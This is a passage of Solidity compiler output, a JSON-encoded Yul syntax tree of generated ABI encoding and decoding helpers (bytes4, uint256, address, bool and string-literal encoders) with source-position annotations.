nt","src":"5434:73:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"5479:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"5490:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"5475:3:15"},"nodeType":"YulFunctionCall","src":"5475:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"5499:7:15"}],"functionName":{"name":"abi_decode_t_bytes4_fromMemory","nodeType":"YulIdentifier","src":"5444:30:15"},"nodeType":"YulFunctionCall","src":"5444:63:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"5434:6:15"}]}]}]},"name":"abi_decode_tuple_t_bytes4_fromMemory","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"5221:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"5232:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"5244:6:15","type":""}],"src":"5175:349:15"},{"body":{"nodeType":"YulBlock","src":"5596:263:15","statements":[{"body":{"nodeType":"YulBlock","src":"5642:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"5644:77:15"},"nodeType":"YulFunctionCall","src":"5644:79:15"},"nodeType":"YulExpressionStatement","src":"5644:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"5617:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"5626:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"5613:3:15"},"nodeType":"YulFunctionCall","src":"5613:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"5638:2:15","type":"","value":"32"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"5609:3:15"},"nodeType":"YulFunctionCall","src":"5609:32:15"},"nodeType":"YulIf","src":"5606:119:15"},{"nodeType":"YulBlock","src":"5735:117:15","statements":[{"nodeType":"YulVariableDeclaration","src":"5750:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"5764:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"5754:6:15","type":""}]},{"nodeType":"YulAssignment","src":"5779:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"5814:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"5825:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"5810:3:15"},"nodeType":"YulFunctionCall","src":"5810:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"5834:7:15"}],"functionName":{"name":"abi_decode_t_uint256","nodeType":"YulIdentifier","src":"5789:20:15"},"nodeType":"YulFunctionCall","src":"5789:53:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"5779:6:15"}]}]}]},"name":"abi_decode_tuple_t_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"5566:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"5577:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"5589:6:15","type":""}],"src":"5530:329:15"},{"body":{"nodeType":"YulBlock","src":"5930:53:15","statements":[{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"5947:3:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"5970:5:15"}],"functionName":{"name":"cleanup_t_address","nodeType":"YulIdentifier","src":"5952:17:15"},"nodeType":"YulFunctionCall","src":"5952:24:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"5940:6:15"},"nodeType":"YulFunctionCall","src":"5940:37:15"},"nodeType":"YulExpressionStatement","src":"5940:37:15"}]},"name":"abi_encode_t_address_to_t_address_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"5918:5:15","type":""},{"name":"pos","nodeType":"YulTypedName","src":"5925:3:15","type":""}],"src":"5865:118:15"},{"body":{"nodeType":"YulBlock","src":"6048:50:15","statements":[{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"6065:3:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"6085:5:15"}],"functionName":{"name":"cleanup_t_bool","nodeType":"YulIdentifier","src":"6070:14:15"},"nodeType":"YulFunctionCall","src":"6070:21:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"6058:6:15"},"nodeType":"YulFunctionCall","src":"6058:34:15"},"nodeType":"YulExpressionStatement","src":"6058:34:15"}]},"name":"abi_encode_t_bool_to_t_bool_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"6036:5:15","type":""},{"name":"pos","nodeType":"YulTypedName","src":"6043:3:15","type":""}],"src":"5989:109:15"},{"body":{"nodeType":"YulBlock","src":"6194:270:15","statements":[{"nodeType":"YulVariableDeclaration","src":"6204:52:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"6250:5:15"}],"functionName":{"name":"array_length_t_bytes_memory_ptr","nodeType":"YulIdentifier","src":"6218:31:15"},"nodeType":"YulFunctionCall","src":"6218:38:15"},"variables":[{"name":"length","nodeType":"YulTypedName","src":"6208:6:15","type":""}]},{"nodeType":"YulAssignment","src":"6265:77:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"6330:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"6335:6:15"}],"functionName":{"name":"array_storeLengthForEncoding_t_bytes_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"6272:57:15"},"nodeType":"YulFunctionCall","src":"6272:70:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"6265:3:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"6377:5:15"},{"kind":"number","nodeType":"YulLiteral","src":"6384:4:15","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"6373:3:15"},"nodeType":"YulFunctionCall","src":"6373:16:15"},{"name":"pos","nodeType":"YulIdentifier","src":"6391:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"6396:6:15"}],"functionName":{"name":"copy_memory_to_memory","nodeType":"YulIdentifier","src":"6351:21:15"},"nodeType":"YulFunctionCall","src":"6351:52:15"},"nodeType":"YulExpressionStatement","src":"6351:52:15"},{"nodeType":"YulAssignment","src":"6412:46:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"6423:3:15"},{"arguments":[{"name":"length","nodeType":"YulIdentifier","src":"6450:6:15"}],"functionName":{"name":"round_up_to_mul_of_32","nodeType":"YulIdentifier","src":"6428:21:15"},"nodeType":"YulFunctionCall","src":"6428:29:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"6419:3:15"},"nodeType":"YulFunctionCall","src":"6419:39:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"6412:3:15"}]}]},"name":"abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"6175:5:15","type":""},{"name":"pos","nodeType":"YulTypedName","src":"6182:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"6190:3:15","type":""}],"src":"6104:360:15"},{"body":{"nodeType":"YulBlock","src":"6562:272:15","statements":[{"nodeType":"YulVariableDeclaration","src":"6572:53:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"6619:5:15"}],"functionName":{"name":"array_length_t_string_memory_ptr","nodeType":"YulIdentifier","src":"6586:32:15"},"nodeType":"YulFunctionCall","src":"6586:39:15"},"variables":[{"name":"length","nodeType":"YulTypedName","src":"6576:6:15","type":""}]},{"nodeType":"YulAssignment","src":"6634:78:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"6700:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"6705:6:15"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"6641:58:15"},"nodeType":"YulFunctionCall","src":"6641:71:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"6634:3:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"6747:5:15"},{"kind":"number","nodeType":"YulLiteral","src":"6754:4:15","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"6743:3:15"},"nodeType":"YulFunctionCall","src":"6743:16:15"},{"name":"pos","nodeType":"YulIdentifier","src":"6761:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"6766:6:15"}],"functionName":{"name":"copy_memory_to_memory","nodeType":"YulIdentifier","src":"6721:21:15"},"nodeType":"YulFunctionCall","src":"6721:52:15"},"nodeType":"YulExpressionStatement","src":"6721:52:15"},{"nodeType":"YulAssignment","src":"6782:46:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"6793:3:15"},{"arguments":[{"name":"length","nodeType":"YulIdentifier","src":"6820:6:15"}],"functionName":{"name":"round_up_to_mul_of_32","nodeType":"YulIdentifier","src":"6798:21:15"},"nodeType":"YulFunctionCall","src":"6798:29:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"6789:3:15"},"nodeType":"YulFunctionCall","src":"6789:39:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"6782:3:15"}]}]},"name":"abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"6543:5:15","type":""},{"name":"pos","nodeType":"YulTypedName","src":"6550:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"6558:3:15","type":""}],"src":"6470:364:15"},{"body":{"nodeType":"YulBlock","src":"6950:267:15","statements":[{"nodeType":"YulVariableDeclaration","src":"6960:53:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"7007:5:15"}],"functionName":{"name":"array_length_t_string_memory_ptr","nodeType":"YulIdentifier","src":"6974:32:15"},"nodeType":"YulFunctionCall","src":"6974:39:15"},"variables":[{"name":"length","nodeType":"YulTypedName","src":"6964:6:15","type":""}]},{"nodeType":"YulAssignment","src":"7022:96:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"7106:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"7111:6:15"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_nonPadded_inplace_fromStack","nodeType":"YulIdentifier","src":"7029:76:15"},"nodeType":"YulFunctionCall","src":"7029:89:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"7022:3:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"7153:5:15"},{"kind":"number","nodeType":"YulLiteral","src":"7160:4:15","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"7149:3:15"},"nodeType":"YulFunctionCall","src":"7149:16:15"},{"name":"pos","nodeType":"YulIdentifier","src":"7167:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"7172:6:15"}],"functionName":{"name":"copy_memory_to_memory","nodeType":"YulIdentifier","src":"7127:21:15"},"nodeType":"YulFunctionCall","src":"7127:52:15"},"nodeType":"YulExpressionStatement","src":"7127:52:15"},{"nodeType":"YulAssignment","src":"7188:23:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"7199:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"7204:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"7195:3:15"},"nodeType":"YulFunctionCall","src":"7195:16:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"7188:3:15"}]}]},"name":"abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_nonPadded_inplace_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"6931:5:15","type":""},{"name":"pos","nodeType":"YulTypedName","src":"6938:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"6946:3:15","type":""}],"src":"6840:377:15"},{"body":{"nodeType":"YulBlock","src":"7369:220:15","statements":[{"nodeType":"YulAssignment","src":"7379:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"7445:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"7450:2:15","type":"","value":"45"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"7386:58:15"},"nodeType":"YulFunctionCall","src":"7386:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"7379:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"7551:3:15"}],"functionName":{"name":"store_literal_in_memory_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af","nodeType":"YulIdentifier","src":"7462:88:15"},"nodeType":"YulFunctionCall","src":"7462:93:15"},"nodeType":"YulExpressionStatement","src":"7462:93:15"},{"nodeType":"YulAssignment","src":"7564:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"7575:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"7580:2:15","type":"","value":"64"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"7571:3:15"},"nodeType":"YulFunctionCall","src":"7571:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"7564:3:15"}]}]},"name":"abi_encode_t_stringliteral_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"7357:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"7365:3:15","type":""}],"src":"7223:366:15"},{"body":{"nodeType":"YulBlock","src":"7741:220:15","statements":[{"nodeType":"YulAssignment","src":"7751:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"7817:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"7822:2:15","type":"","value":"50"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"7758:58:15"},"nodeType":"YulFunctionCall","src":"7758:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"7751:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"7923:3:15"}],"functionName":{"name":"store_literal_in_memory_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e","nodeType":"YulIdentifier","src":"7834:88:15"},"nodeType":"YulFunctionCall","src":"7834:93:15"},"nodeType":"YulExpressionStatement","src":"7834:93:15"},{"nodeType":"YulAssignment","src":"7936:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"7947:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"7952:2:15","type":"","value":"64"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"7943:3:15"},"nodeType":"YulFunctionCall","src":"7943:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"7936:3:15"}]}]},"name":"abi_encode_t_stringliteral_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"7729:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"7737:3:15","type":""}],"src":"7595:366:15"},{"body":{"nodeType":"YulBlock","src":"8113:220:15","statements":[{"nodeType":"YulAssignment","src":"8123:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"8189:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"8194:2:15","type":"","value":"37"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"8130:58:15"},"nodeType":"YulFunctionCall","src":"8130:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"8123:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"8295:3:15"}],"functionName":{"name":"store_literal_in_memory_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48","nodeType":"YulIdentifier","src":"8206:88:15"},"nodeType":"YulFunctionCall","src":"8206:93:15"},"nodeType":"YulExpressionStatement","src":"8206:93:15"},{"nodeType":"YulAssignment","src":"8308:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"8319:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"8324:2:15","type":"","value":"64"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"8315:3:15"},"nodeType":"YulFunctionCall","src":"8315:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"8308:3:15"}]}]},"name":"abi_encode_t_stringliteral_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"8101:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"8109:3:15","type":""}],"src":"7967:366:15"},{"body":{"nodeType":"YulBlock","src":"8485:220:15","statements":[{"nodeType":"YulAssignment","src":"8495:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"8561:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"8566:2:15","type":"","value":"36"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"8502:58:15"},"nodeType":"YulFunctionCall","src":"8502:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"8495:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"8667:3:15"}],"functionName":{"name":"store_literal_in_memory_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4","nodeType":"YulIdentifier","src":"8578:88:15"},"nodeType":"YulFunctionCall","src":"8578:93:15"},"nodeType":"YulExpressionStatement","src":"8578:93:15"},{"nodeType":"YulAssignment","src":"8680:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"8691:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"8696:2:15","type":"","value":"64"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"8687:3:15"},"nodeType":"YulFunctionCall","src":"8687:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"8680:3:15"}]}]},"name":"abi_encode_t_stringliteral_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"8473:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"8481:3:15","type":""}],"src":"8339:366:15"},{"body":{"nodeType":"YulBlock","src":"8857:220:15","statements":[{"nodeType":"YulAssignment","src":"8867:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"8933:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"8938:2:15","type":"","value":"25"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"8874:58:15"},"nodeType":"YulFunctionCall","src":"8874:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"8867:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"9039:3:15"}],"functionName":{"name":"store_literal_in_memory_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05","nodeType":"YulIdentifier","src":"8950:88:15"},"nodeType":"YulFunctionCall","src":"8950:93:15"},"nodeType":"YulExpressionStatement","src":"8950:93:15"},{"nodeType":"YulAssignment","src":"9052:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"9063:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"9068:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"9059:3:15"},"nodeType":"YulFunctionCall","src":"9059:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"9052:3:15"}]}]},"name":"abi_encode_t_stringliteral_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"8845:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"8853:3:15","type":""}],"src":"8711:366:15"},{"body":{"nodeType":"YulBlock","src":"9229:220:15","statements":[{"nodeType":"YulAssignment","src":"9239:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"9305:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"9310:2:15","type":"","value":"41"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"9246:58:15"},"nodeType":"YulFunctionCall","src":"9246:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"9239:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"9411:3:15"}],"functionName":{"name":"store_literal_in_memory_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159","nodeType":"YulIdentifier","src":"9322:88:15"},"nodeType":"YulFunctionCall","src":"9322:93:15"},"nodeType":"YulExpressionStatement","src":"9322:93:15"},{"nodeType":"YulAssignment","src":"9424:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"9435:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"9440:2:15","type":"","value":"64"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"9431:3:15"},"nodeType":"YulFunctionCall","src":"9431:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"9424:3:15"}]}]},"name":"abi_encode_t_stringliteral_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"9217:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"9225:3:15","type":""}],"src":"9083:366:15"},{"body":{"nodeType":"YulBlock","src":"9601:220:15","statements":[{"nodeType":"YulAssignment","src":"9611:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"9677:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"9682:2:15","type":"","value":"24"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"9618:58:15"},"nodeType":"YulFunctionCall","src":"9618:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"9611:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"9783:3:15"}],"functionName":{"name":"store_literal_in_memory_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f","nodeType":"YulIdentifier","src":"9694:88:15"},"nodeType":"YulFunctionCall","src":"9694:93:15"},"nodeType":"YulExpressionStatement","src":"9694:93:15"},{"nodeType":"YulAssignment","src":"9796:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"9807:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"9812:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"9803:3:15"},"nodeType":"YulFunctionCall","src":"9803:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"9796:3:15"}]}]},"name":"abi_encode_t_stringliteral_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"9589:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"9597:3:15","type":""}],"src":"9455:366:15"},{"body":{"nodeType":"YulBlock","src":"9973:220:15","statements":[{"nodeType":"YulAssignment","src":"9983:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"10049:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"10054:2:15","type":"","value":"33"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"9990:58:15"},"nodeType":"YulFunctionCall","src":"9990:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"9983:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"10155:3:15"}],"functionName":{"name":"store_literal_in_memory_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942","nodeType":"YulIdentifier","src":"10066:88:15"},"nodeType":"YulFunctionCall","src":"10066:93:15"},"nodeType":"YulExpressionStatement","src":"10066:93:15"},{"nodeType":"YulAssignment","src":"10168:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"10179:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"10184:2:15","type":"","value":"64"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"10175:3:15"},"nodeType":"YulFunctionCall","src":"10175:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"10168:3:15"}]}]},"name":"abi_encode_t_stringliteral_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"9961:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"9969:3:15","type":""}],"src":"9827:366:15"},{"body":{"nodeType":"YulBlock","src":"10345:220:15","statements":[{"nodeType":"YulAssignment","src":"10355:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"10421:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"10426:2:15","type":"","value":"61"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"10362:58:15"},"nodeType":"YulFunctionCall","src":"10362:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"10355:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"10527:3:15"}],"functionName":{"name":"store_literal_in_memory_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83","nodeType":"YulIdentifier","src":"10438:88:15"},"nodeType":"YulFunctionCall","src":"10438:93:15"},"nodeType":"YulExpressionStatement","src":"10438:93:15"},{"nodeType":"YulAssignment","src":"10540:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"10551:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"10556:2:15","type":"","value":"64"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"10547:3:15"},"nodeType":"YulFunctionCall","src":"10547:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"10540:3:15"}]}]},"name":"abi_encode_t_stringliteral_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"10333:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"10341:3:15","type":""}],"src":"10199:366:15"},{"body":{"nodeType":"YulBlock","src":"10636:53:15","statements":[{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"10653:3:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"10676:5:15"}],"functionName":{"name":"cleanup_t_uint256","nodeType":"YulIdentifier","src":"10658:17:15"},"nodeType":"YulFunctionCall","src":"10658:24:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"10646:6:15"},"nodeType":"YulFunctionCall","src":"10646:37:15"},"nodeType":"YulExpressionStatement","src":"10646:37:15"}]},"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"10624:5:15","type":""},{"name":"pos","nodeType":"YulTypedName","src":"10631:3:15","type":""}],"src":"10571:118:15"},{"body":{"nodeType":"YulBlock","src":"10879:251:15","statements":[{"nodeType":"YulAssignment","src":"10890:102:15","value":{"arguments":[{"name":"value0","nodeType":"YulIdentifier","src":"10979:6:15"},{"name":"pos","nodeType":"YulIdentifier","src":"10988:3:15"}],"functionName":{"name":"abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_nonPadded_inplace_fromStack","nodeType":"YulIdentifier","src":"10897:81:15"},"nodeType":"YulFunctionCall","src":"10897:95:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"10890:3:15"}]},{"nodeType":"YulAssignment","src":"11002:102:15","value":{"arguments":[{"name":"value1","nodeType":"YulIdentifier","src":"11091:6:15"},{"name":"pos","nodeType":"YulIdentifier","src":"11100:3:15"}],"functionName":{"name":"abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_nonPadded_inplace_fromStack","nodeType":"YulIdentifier","src":"11009:81:15"},"nodeType":"YulFunctionCall","src":"11009:95:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"